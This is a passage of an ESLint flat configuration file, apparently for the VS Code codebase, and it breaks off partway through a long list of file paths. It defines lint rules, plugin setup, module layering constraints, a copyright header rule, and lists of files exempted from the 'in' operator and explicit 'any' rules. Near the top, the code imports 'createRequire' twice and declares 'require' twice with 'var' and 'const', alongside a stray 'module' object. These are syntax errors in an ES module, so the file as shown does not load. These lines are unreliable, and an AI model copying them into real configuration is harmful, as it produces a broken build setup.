/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// @ts-check
import fs from 'fs';
import { builtinModules } from 'module';
import path from 'path';
import tseslint from 'typescript-eslint';

import stylisticTs from '@stylistic/eslint-plugin-ts';
import * as pluginLocal from './.eslint-plugin-local/index.ts';
import * as pluginCopilotLocal from './extensions/copilot/.eslintplugin/index.ts';
import pluginImport from 'eslint-plugin-import';
import pluginJsdoc from 'eslint-plugin-jsdoc';

import pluginHeader from 'eslint-plugin-header';
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

pluginHeader.rules.header.meta.schema = false;

const ignores = fs.readFileSync(path.join(import.meta.dirname, '.eslint-ignore'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.filter(line => line && !line.startsWith('#'));

export default tseslint.config(
	// Global ignores
	{
		ignores: [
			...ignores,
			'!**/.eslint-plugin-local/**/*'
		],
	},
	// All files (JS and TS)
	{
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
			'header': pluginHeader,
		},
		rules: {
			'constructor-super': 'warn',
			'curly': 'warn',
			'eqeqeq': 'warn',
			'prefer-const': [
				'warn',
				{
					'destructuring': 'all'
				}
			],
			'no-buffer-constructor': 'warn',
			'no-caller': 'warn',
			'no-case-declarations': 'warn',
			'no-debugger': 'warn',
			'no-duplicate-case': 'warn',
			'no-duplicate-imports': 'warn',
			'no-eval': 'warn',
			'no-async-promise-executor': 'warn',
			'no-extra-semi': 'warn',
			'no-new-wrappers': 'warn',
			'no-redeclare': 'off',
			'no-sparse-arrays': 'warn',
			'no-throw-literal': 'warn',
			'no-unsafe-finally': 'warn',
			'no-unused-labels': 'warn',
			'no-misleading-character-class': 'warn',
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context'
			], // non-complete list of globals that are easy to access unintentionally
			'no-var': 'warn',
			'semi': 'warn',
			'local/code-translation-remind': 'warn',
			'local/code-no-declare-const-enum': 'warn',
			'local/code-parameter-properties-must-have-explicit-accessibility': 'warn',
			'local/code-no-nls-in-standalone-editor': 'warn',
			'local/code-no-potentially-unsafe-disposables': 'warn',
			'local/code-no-dangerous-type-assertions': 'warn',
			'local/code-no-any-casts': 'warn',
			'local/code-no-standalone-editor': 'warn',
			'local/code-no-unexternalized-strings': 'warn',
			'local/code-must-use-super-dispose': 'warn',
			'local/code-declare-service-brand': 'warn',
			'local/code-no-reader-after-await': 'warn',
			'local/code-no-accessor-after-await': 'warn',
			'local/code-no-observable-get-in-reactive-context': 'warn',
			'local/code-no-localized-model-description': 'warn',
			'local/code-policy-localization-key-match': 'warn',
			'local/code-no-localization-template-literals': 'error',
			'local/code-no-icons-in-localized-strings': 'warn',
			'local/code-no-http-import': ['warn', { target: 'src/vs/**' }],
			'local/code-no-deep-import-of-internal': ['error', { '.*Internal': true, 'searchExtTypesInternal': false }],
			'local/code-layering': [
				'warn',
				{
					'common': [],
					'node': [
						'common'
					],
					'browser': [
						'common'
					],
					'electron-browser': [
						'common',
						'browser'
					],
					'electron-utility': [
						'common',
						'node'
					],
					'electron-main': [
						'common',
						'node',
						'electron-utility'
					]
				}
			],
			'header/header': [
				2,
				'block',
				[
					'---------------------------------------------------------------------------------------------',
					' *  Copyright (c) Microsoft Corporation. All rights reserved.',
					' *  Licensed under the MIT License. See License.txt in the project root for license information.',
					' *--------------------------------------------------------------------------------------------'
				]
			]
		},
	},
	// TS
	{
		files: [
			'**/*.{ts,tsx,mts,cts}',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@stylistic/ts': stylisticTs,
			'@typescript-eslint': tseslint.plugin,
			'local': pluginLocal,
			'jsdoc': pluginJsdoc,
		},
		rules: {
			// Disable built-in semi rules in favor of stylistic
			'semi': 'off',
			'@stylistic/ts/semi': 'warn',
			'@stylistic/ts/member-delimiter-style': 'warn',
			'local/code-no-unused-expressions': [
				'warn',
				{
					'allowTernary': true
				}
			],
			'jsdoc/no-types': 'warn',
			'local/code-no-static-self-ref': 'warn',
			'@typescript-eslint/naming-convention': [
				'warn',
				{
					'selector': 'class',
					'format': [
						'PascalCase'
					]
				}
			]
		}
	},
	// Disallow common telemetry properties in event data
	{
		files: [
			'src/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-telemetry-common-property': 'warn',
		}
	},
	// Disallow 'in' operator except in type predicates
	{
		files: [
			'**/*.ts',
			'.eslint-plugin-local/**/*.ts', // Explicitly include files under dot directories
		],
		ignores: [
			'src/bootstrap-node.ts',
			'build/lib/extensions.ts',
			'build/lib/test/render.test.ts',
			'extensions/copilot/**/*',
			'extensions/debug-auto-launch/src/extension.ts',
			'extensions/emmet/src/updateImageSize.ts',
			'extensions/emmet/src/util.ts',
			'extensions/github-authentication/src/node/fetch.ts',
			'extensions/tunnel-forwarding/src/extension.ts',
			'extensions/typescript-language-features/src/utils/platform.ts',
			'extensions/typescript-language-features/web/src/webServer.ts',
			'src/vs/base/browser/broadcast.ts',
			'src/vs/base/browser/canIUse.ts',
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/markdownRenderer.ts',
			'src/vs/base/browser/touch.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/desktopEnvironmentInfo.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/editor/browser/controller/editContext/native/debugEditContext.ts',
			'src/vs/editor/browser/gpu/gpuUtils.ts',
			'src/vs/editor/browser/gpu/taskQueue.ts',
			'src/vs/editor/browser/view.ts',
			'src/vs/editor/browser/widget/diffEditor/diffEditorWidget.ts',
			'src/vs/editor/browser/widget/diffEditor/utils.ts',
			'src/vs/editor/browser/widget/multiDiffEditor/multiDiffEditorWidgetImpl.ts',
			'src/vs/editor/common/config/editorOptions.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteContribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteController.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/edit.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/provideInlineCompletions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/platform/accessibilitySignal/browser/accessibilitySignalService.ts',
			'src/vs/platform/configuration/common/configuration.ts',
			'src/vs/platform/configuration/common/configurationModels.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/test/common/scanner.test.ts',
			'src/vs/platform/dataChannel/browser/forwardingTelemetryService.ts',
			'src/vs/platform/hover/browser/hoverService.ts',
			'src/vs/platform/hover/browser/hoverWidget.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/mcp/common/mcpManagementCli.ts',
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/browser/mainThreadDebugService.ts',
			'src/vs/workbench/api/browser/mainThreadTesting.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHostChatAgents2.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostNotebookKernels.ts',
			'src/vs/workbench/api/common/extHostQuickOpen.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/node/loopbackServer.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/extHostTypeConverters.test.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/browser/parts/paneCompositeBar.ts',
			'src/vs/workbench/browser/parts/titlebar/titlebarPart.ts',
			'src/vs/workbench/browser/workbench.ts',
			'src/vs/workbench/common/notifications.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/attachments/chatAttachmentResolveService.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatAttachmentsContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatConfirmationWidget.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatElicitationContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatReferencesContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatTreeContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/toolInvocationParts/abstractToolConfirmationSubPart.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSession.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSessionStorage.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatInlineAnchorWidget.ts',
			'src/vs/workbench/contrib/chat/browser/accessibility/chatResponseAccessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/widget/input/editor/chatInputCompletions.ts',
			'src/vs/workbench/contrib/chat/common/model/chatModel.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.test.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.ts',
			'src/vs/workbench/contrib/chat/test/common/tools/builtinTools/manageTodoListTool.test.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/debugModel.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replAccessibilityAnnouncer.ts',
			'src/vs/workbench/contrib/editSessions/browser/editSessionsStorageService.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/extensions/common/extensionQuery.ts',
			'src/vs/workbench/contrib/interactive/browser/interactiveEditorInput.ts',
			'src/vs/workbench/contrib/issue/browser/issueFormService.ts',
			'src/vs/workbench/contrib/issue/browser/issueQuickAccess.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mcp/browser/mcpElicitationService.ts',
			'src/vs/workbench/contrib/mcp/common/mcpLanguageModelToolContribution.ts',
			'src/vs/workbench/contrib/mcp/common/mcpResourceFilesystem.ts',
			'src/vs/workbench/contrib/mcp/common/mcpSamplingLog.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServer.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServerRequestHandler.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpRegistryTypes.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpServerRequestHandler.test.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/cellOutputActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/notebook.chat.contribution.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelView.ts',
			'src/vs/workbench/contrib/output/browser/outputView.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/remoteTunnel/electron-browser/remoteTunnel.contribution.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/listProjection.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/treeProjection.ts',
			'src/vs/workbench/contrib/testing/browser/testCoverageBars.ts',
			'src/vs/workbench/contrib/testing/browser/testExplorerActions.ts',
			'src/vs/workbench/contrib/testing/browser/testingOutputPeek.ts',
			'src/vs/workbench/contrib/testing/browser/testingProgressUiService.ts',
			'src/vs/workbench/contrib/testing/browser/testResultsView/testResultsTree.ts',
			'src/vs/workbench/contrib/testing/common/testCoverageService.ts',
			'src/vs/workbench/contrib/testing/common/testResultService.ts',
			'src/vs/workbench/contrib/testing/common/testingChatAgentTool.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/themes/browser/themes.contribution.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStarted.contribution.ts',
			'src/vs/workbench/services/environment/electron-browser/environmentService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingIO.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/textSearchManager.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/platform/agentHost/common/state/protocol/reducers.ts',
			'test/automation/src/playwrightDriver.ts',
			'.eslint-plugin-local/**/*',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-in-operator': 'warn',
		}
	},
	// Strict no explicit `any`
	{
		files: [
			// Extensions
			'extensions/git/src/**/*.ts',
			'extensions/git-base/src/**/*.ts',
			'extensions/github/src/**/*.ts',
			// vscode
			'src/**/*.ts',
		],
		ignores: [
			// Extensions
			'extensions/git/src/commands.ts',
			'extensions/git/src/decorators.ts',
			'extensions/git/src/git.ts',
			'extensions/git/src/util.ts',
			'extensions/git-base/src/decorators.ts',
			'extensions/github/src/util.ts',
			// vscode d.ts
			'src/vs/amdX.ts',
			'src/vs/monaco.d.ts',
			'src/vscode-dts/**',
			// Base
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/mouseEvent.ts',
			'src/vs/base/node/processes.ts',
			'src/vs/base/common/arrays.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/console.ts',
			'src/vs/base/common/decorators.ts',
			'src/vs/base/common/errorMessage.ts',
			'src/vs/base/common/errors.ts',
			'src/vs/base/common/event.ts',
			'src/vs/base/common/hotReload.ts',
			'src/vs/base/common/hotReloadHelpers.ts',
			'src/vs/base/common/json.ts',
			'src/vs/base/common/jsonSchema.ts',
			'src/vs/base/common/lifecycle.ts',
			'src/vs/base/common/map.ts',
			'src/vs/base/common/marshalling.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/performance.ts',
			'src/vs/base/common/platform.ts',
			'src/vs/base/common/processes.ts',
			'src/vs/base/common/types.ts',
			'src/vs/base/common/uriIpc.ts',
			'src/vs/base/common/verifier.ts',
			'src/vs/base/common/observableInternal/base.ts',
			'src/vs/base/common/observableInternal/changeTracker.ts',
			'src/vs/base/common/observableInternal/set.ts',
			'src/vs/base/common/observableInternal/transaction.ts',
			'src/vs/base/common/worker/webWorkerBootstrap.ts',
			'src/vs/base/test/common/mock.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/base/test/common/troubleshooting.ts',
			'src/vs/base/test/common/utils.ts',
			'src/vs/base/browser/ui/breadcrumbs/breadcrumbsWidget.ts',
			'src/vs/base/browser/ui/grid/grid.ts',
			'src/vs/base/browser/ui/grid/gridview.ts',
			'src/vs/base/browser/ui/list/listPaging.ts',
			'src/vs/base/browser/ui/list/listView.ts',
			'src/vs/base/browser/ui/list/listWidget.ts',
			'src/vs/base/browser/ui/list/rowCache.ts',
			'src/vs/base/browser/ui/sash/sash.ts',
			'src/vs/base/browser/ui/table/tableWidget.ts',
			'src/vs/base/parts/ipc/common/ipc.net.ts',
			'src/vs/base/parts/ipc/common/ipc.ts',
			'src/vs/base/parts/ipc/electron-main/ipcMain.ts',
			'src/vs/base/parts/ipc/node/ipc.cp.ts',
			'src/vs/base/common/observableInternal/experimental/reducer.ts',
			'src/vs/base/common/observableInternal/experimental/utils.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugGetDependencyGraph.ts',
			'src/vs/base/common/observableInternal/logging/logging.ts',
			'src/vs/base/common/observableInternal/observables/baseObservable.ts',
			'src/vs/base/common/observableInternal/observables/derived.ts',
			'src/vs/base/common/observableInternal/observables/derivedImpl.ts',
			'src/vs/base/common/observableInternal/observables/observableFromEvent.ts',
			'src/vs/base/common/observableInternal/observables/observableSignalFromEvent.ts',
			'src/vs/base/common/observableInternal/reactions/autorunImpl.ts',
			'src/vs/base/common/observableInternal/utils/utils.ts',
			'src/vs/base/common/observableInternal/utils/utilsCancellation.ts',
			'src/vs/base/parts/ipc/test/node/testService.ts',
			'src/vs/base/common/observableInternal/logging/debugger/debuggerRpc.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/rpc.ts',
			'src/vs/base/test/browser/ui/grid/util.ts',
			// Platform
			'src/vs/platform/commands/common/commands.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/common/contextkey.ts',
			'src/vs/platform/contextview/browser/contextView.ts',
			'src/vs/platform/debug/common/extensionHostDebugIpc.ts',
			'src/vs/platform/debug/electron-main/extensionHostDebugIpc.ts',
			'src/vs/platform/diagnostics/common/diagnostics.ts',
			'src/vs/platform/download/common/downloadIpc.ts',
			'src/vs/platform/extensions/common/extensions.ts',
			'src/vs/platform/instantiation/common/descriptors.ts',
			'src/vs/platform/instantiation/common/extensions.ts',
			'src/vs/platform/instantiation/common/instantiation.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/instantiation/common/serviceCollection.ts',
			'src/vs/platform/keybinding/common/keybinding.ts',
			'src/vs/platform/keybinding/common/keybindingResolver.ts',
			'src/vs/platform/keybinding/common/keybindingsRegistry.ts',
			'src/vs/platform/keybinding/common/resolvedKeybindingItem.ts',
			'src/vs/platform/languagePacks/node/languagePacks.ts',
			'src/vs/platform/list/browser/listService.ts',
			'src/vs/platform/log/browser/log.ts',
			'src/vs/platform/log/common/log.ts',
			'src/vs/platform/log/common/logIpc.ts',
			'src/vs/platform/log/electron-main/logIpc.ts',
			'src/vs/platform/meteredConnection/electron-main/meteredConnectionChannel.ts',
			'src/vs/platform/observable/common/wrapInHotClass.ts',
			'src/vs/platform/observable/common/wrapInReloadableClass.ts',
			'src/vs/platform/policy/common/policyIpc.ts',
			'src/vs/platform/profiling/common/profilingTelemetrySpec.ts',
			'src/vs/platform/quickinput/browser/quickInputActions.ts',
			'src/vs/platform/quickinput/common/quickInput.ts',
			'src/vs/platform/registry/common/platform.ts',
			'src/vs/platform/remote/browser/browserSocketFactory.ts',
			'src/vs/platform/remote/browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remote/common/remoteAgentConnection.ts',
			'src/vs/platform/remote/common/remoteAuthorityResolver.ts',
			'src/vs/platform/remote/electron-browser/electronRemoteResourceLoader.ts',
			'src/vs/platform/remote/electron-browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remoteTunnel/node/remoteTunnelService.ts',
			'src/vs/platform/request/common/request.ts',
			'src/vs/platform/request/common/requestIpc.ts',
			'src/vs/platform/request/electron-utility/requestService.ts',
			'src/vs/platform/request/node/proxy.ts',
			'src/vs/platform/telemetry/browser/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/remoteTelemetryChannel.ts',
			'src/vs/platform/telemetry/node/errorTelemetry.ts',
			'src/vs/platform/theme/common/iconRegistry.ts',
			'src/vs/platform/theme/common/tokenClassificationRegistry.ts',
			'src/vs/platform/update/common/updateIpc.ts',
			'src/vs/platform/update/electron-main/updateService.snap.ts',
			'src/vs/platform/url/common/urlIpc.ts',
			'src/vs/platform/userDataProfile/common/userDataProfileIpc.ts',
			'src/vs/platform/userDataProfile/electron-main/userDataProfileStorageIpc.ts',
			'src/vs/platform/userDataSync/common/abstractSynchronizer.ts',
			'src/vs/platform/userDataSync/common/extensionsMerge.ts',
			'src/vs/platform/userDataSync/common/extensionsSync.ts',
			'src/vs/platform/userDataSync/common/globalStateMerge.ts',
			'src/vs/platform/userDataSync/common/globalStateSync.ts',
			'src/vs/platform/userDataSync/common/settingsMerge.ts',
			'src/vs/platform/userDataSync/common/settingsSync.ts',
			'src/vs/platform/userDataSync/common/userDataSync.ts',
			'src/vs/platform/userDataSync/common/userDataSyncIpc.ts',
			'src/vs/platform/userDataSync/common/userDataSyncServiceIpc.ts',
			'src/vs/platform/webview/common/webviewManagerService.ts',
			'src/vs/platform/instantiation/test/common/instantiationServiceMock.ts',
			'src/vs/platform/keybinding/test/common/mockKeybindingService.ts',
			// Editor
			'src/vs/editor/standalone/browser/standaloneEditor.ts',
			'src/vs/editor/standalone/browser/standaloneLanguages.ts',
			'src/vs/editor/standalone/browser/standaloneServices.ts',
			'src/vs/editor/test/browser/testCodeEditor.ts',
			'src/vs/editor/test/common/testTextModel.ts',
			'src/vs/editor/contrib/bracketMatching/browser/bracketMatching.ts',
			'src/vs/editor/contrib/codeAction/browser/codeAction.ts',
			'src/vs/editor/contrib/codeAction/browser/codeActionCommands.ts',
			'src/vs/editor/contrib/codeAction/common/types.ts',
			'src/vs/editor/contrib/colorPicker/browser/colorDetector.ts',
			'src/vs/editor/contrib/diffEditorBreadcrumbs/browser/contribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/dropIntoEditorContribution.ts',
			'src/vs/editor/contrib/find/browser/findController.ts',
			'src/vs/editor/contrib/find/browser/findModel.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/symbolNavigation.ts',
			'src/vs/editor/contrib/hover/browser/hoverActions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/structuredLogger.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/utils.ts',
			'src/vs/editor/contrib/smartSelect/browser/smartSelect.ts',
			'src/vs/editor/contrib/stickyScroll/browser/stickyScrollModelProvider.ts',
			'src/vs/editor/contrib/unicodeHighlighter/browser/unicodeHighlighter.ts',
			'src/vs/editor/contrib/wordHighlighter/browser/wordHighlighter.ts',
			'src/vs/editor/standalone/common/monarch/monarchCommon.ts',
			'src/vs/editor/standalone/common/monarch/monarchCompile.ts',
			'src/vs/editor/standalone/common/monarch/monarchLexer.ts',
			'src/vs/editor/standalone/common/monarch/monarchTypes.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/controller/commands.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/inlineCompletionsModel.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/typingSpeed.ts',
			'src/vs/editor/contrib/inlineCompletions/test/browser/utils.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/components/gutterIndicatorView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/utils/utils.ts',
			// Workbench
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHost.protocol.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostCodeInsets.ts',
			'src/vs/workbench/api/common/extHostCommands.ts',
			'src/vs/workbench/api/common/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/common/extHostDataChannels.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostExtensionActivator.ts',
			'src/vs/workbench/api/common/extHostExtensionService.ts',
			'src/vs/workbench/api/common/extHostFileSystemConsumer.ts',
			'src/vs/workbench/api/common/extHostFileSystemEventService.ts',
			'src/vs/workbench/api/common/extHostLanguageFeatures.ts',
			'src/vs/workbench/api/common/extHostLanguageModelTools.ts',
			'src/vs/workbench/api/common/extHostMcp.ts',
			'src/vs/workbench/api/common/extHostMemento.ts',
			'src/vs/workbench/api/common/extHostMessageService.ts',
			'src/vs/workbench/api/common/extHostNotebookDocument.ts',
			'src/vs/workbench/api/common/extHostNotebookDocumentSaveParticipant.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostRpcService.ts',
			'src/vs/workbench/api/common/extHostSCM.ts',
			'src/vs/workbench/api/common/extHostSearch.ts',
			'src/vs/workbench/api/common/extHostStatusBar.ts',
			'src/vs/workbench/api/common/extHostStoragePaths.ts',
			'src/vs/workbench/api/common/extHostTelemetry.ts',
			'src/vs/workbench/api/common/extHostTesting.ts',
			'src/vs/workbench/api/common/extHostTextEditor.ts',
			'src/vs/workbench/api/common/extHostTimeline.ts',
			'src/vs/workbench/api/common/extHostTreeViews.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/common/extHostTypes/es5ClassCompat.ts',
			'src/vs/workbench/api/common/extHostTypes/location.ts',
			'src/vs/workbench/api/common/extHostWebview.ts',
			'src/vs/workbench/api/common/extHostWebviewMessaging.ts',
			'src/vs/workbench/api/common/extHostWebviewPanels.ts',
			'src/vs/workbench/api/common/extHostWebviewView.ts',
			'src/vs/workbench/api/common/extHostWorkspace.ts',
			'src/vs/workbench/api/common/extensionHostMain.ts',
			'src/vs/workbench/api/node/extHostAuthentication.ts',
			'src/vs/workbench/api/node/extHostCLIServer.ts',
			'src/vs/workbench/api/node/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/node/extHostDownloadService.ts',
			'src/vs/workbench/api/node/extHostExtensionService.ts',
			'src/vs/workbench/api/node/extHostMcpNode.ts',
			'src/vs/workbench/api/node/extensionHostProcess.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/api/worker/extensionHostWorker.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibilityConfiguration.ts',
			'src/vs/workbench/contrib/accessibilitySignals/browser/commands.ts',
			'src/vs/workbench/contrib/authentication/browser/actions/manageTrustedMcpServersForAccountAction.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/bulkTextEdits.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPane.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPreview.ts',
			'src/vs/workbench/contrib/codeEditor/browser/inspectEditorTokens/inspectEditorTokens.ts',
			'src/vs/workbench/contrib/codeEditor/browser/outline/documentSymbolsOutline.ts',
			'src/vs/workbench/contrib/codeEditor/electron-browser/selectionClipboard.ts',
			'src/vs/workbench/contrib/commands/common/commands.contribution.ts',
			'src/vs/workbench/contrib/comments/browser/commentsTreeViewer.ts',
			'src/vs/workbench/contrib/comments/browser/commentsView.ts',
			'src/vs/workbench/contrib/comments/browser/reactionsAction.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditorInputFactory.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditors.ts',
			'src/vs/workbench/contrib/customEditor/common/customEditor.ts',
			'src/vs/workbench/contrib/debug/browser/debugActionViewItems.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugCommands.ts',
			'src/vs/workbench/contrib/debug/browser/debugConfigurationManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorActions.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorContribution.ts',
			'src/vs/workbench/contrib/debug/browser/debugHover.ts',
			'src/vs/workbench/contrib/debug/browser/debugService.ts',
			'src/vs/workbench/contrib/debug/browser/debugSession.ts',
			'src/vs/workbench/contrib/debug/browser/rawDebugSession.ts',
			'src/vs/workbench/contrib/debug/browser/repl.ts',
			'src/vs/workbench/contrib/debug/browser/replViewer.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/abstractDebugAdapter.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replModel.ts',
			'src/vs/workbench/contrib/debug/test/common/mockDebug.ts',
			'src/vs/workbench/contrib/editSessions/common/workspaceStateSync.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/utils.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/telemetry/arcTelemetrySender.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionEditor.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionRecommendationNotificationService.ts',
			'src/vs/workbench/contrib/extensions/browser/extensions.contribution.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActions.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActivationProgress.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViewer.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViews.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsWorkbenchService.ts',
